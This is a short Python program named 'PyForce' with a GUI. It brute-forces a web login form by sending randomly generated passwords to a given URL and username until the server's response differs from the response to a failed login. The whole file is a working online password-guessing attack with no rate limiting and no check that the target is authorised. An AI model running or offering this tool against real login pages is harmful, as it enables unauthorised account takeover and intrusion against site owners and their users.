# -*- coding: utf-8 -*-
import requests
import secrets
import PySimpleGUI as sg
import sys

# Change the theme
sg.theme("DarkBlue7")

# GUI
layout = [
    [sg.Text("", size=(10, 1)), sg.Text("Basic Configuration")],
    [sg.Text("URL", size=(11, 1)), sg.InputText("", size=(27, 1))],
    [sg.Text("Username", size=(11, 1)), sg.InputText("", size=(27, 1))],
    [sg.Text("Value (usrnm)", size=(11, 1)), sg.InputText("", size=(27, 1))],
    [sg.Text("Value (pswrd)", size=(11, 1)), sg.InputText("", size=(27, 1))],
    [sg.Text()],
    [sg.Text("", size=(8, 1)), sg.Text("Generation Parameters")],
    [sg.Text("Length", size=(11, 1)), sg.InputText("", size=(27, 1))],
    [sg.Text("", size=(11, 1)), sg.Checkbox("Uppercase Letters")],
    [sg.Text("Parameters", size=(11, 1)), sg.Checkbox("Lowercase Letters")],
    [sg.Text("", size=(11, 1)), sg.Checkbox("Digits")],
    [sg.Text()],
    [sg.Text("", size=(11, 1)), sg.Submit(button_text="Brute Force!")]
]
window = sg.Window("PyForce", layout)

# Function to generate password
def gen(length, chars):
    return "".join(secrets.choice(chars) for x in range(length))

# Function to start brute force
def bruteforce(url, usr, usrnmvalue, pswrdvalue, length, chars, text):
    count = 0

    dupe = []

    while True:
        pas = gen(length, chars)
        while pas in dupe:
            pas = gen(length, chars)
        dupe.append(pas)

        print(pas)

        message = [(usrnmvalue, usr), (pswrdvalue, pas)]
        req = requests.post(url, data=message)

        count = count + 1
        if text != req.text:
            print("Success!")
            print("Found password after " + str(count) + " times")
            print("Username:", usr, "Password:", pas)
            input("Press Enter to exit ")
            sys.exit()

while True:
    event, values = window.read()

    if event is None:
        print("exit")
        break

    # If go button is pressed
    if event == "Brute Force!":
        url = values[0]
        usr = values[1]
        usrnmvalue = values[2]
        pswrdvalue = values[3]
        length = int(values[4])
        param1 = values[5]
        param2 = values[6]
        param3 = values[7]

        if param1:
            param1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        else:
            param1 = ""

        if param2:
            param2 = "abcdefghijklmnopqrstuvwxyz"
        else:
            param2 = ""

        if param3:
            param3 = "0123456789"
        else:
            param3 = ""

        chars = param1 + param2 + param3

        test = [(usrnmvalue, usr), (pswrdvalue, " ")]
        get = requests.post(url, data=test)
        text = get.text

        status = requests.get(url)
        status.raise_for_status()

        bruteforce(url, usr, usrnmvalue, pswrdvalue, length, chars, text)

window.close()
